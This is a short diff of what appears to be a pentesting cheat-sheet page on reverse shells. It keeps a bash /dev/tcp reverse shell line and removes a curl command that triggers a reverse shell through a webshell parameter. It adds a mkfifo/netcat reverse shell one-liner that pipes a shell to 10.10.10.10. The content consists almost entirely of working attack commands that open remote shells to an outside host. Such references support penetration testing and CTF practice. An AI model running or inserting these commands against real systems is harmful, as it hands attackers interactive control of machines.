@@ -214,11 +214,9 @@ bash -i >& /dev/tcp/10.10.14.18/1337 0>&1
 ```
 {% endcode %}
 
-* <mark style="color:purple;">From a</mark> <mark style="color:orange;">**`webshell`**</mark> <mark style="color:purple;">upgrade to a reverse shell:</mark>
-
-{% code title="Use Curl" overflow="wrap" %}
+{% code title="Uses FIFO" overflow="wrap" %}
 ```bash
-curl 'http://target-site/error.php?tokyo=bash+-c+"bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261"'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 ```
 {% endcode %}
 
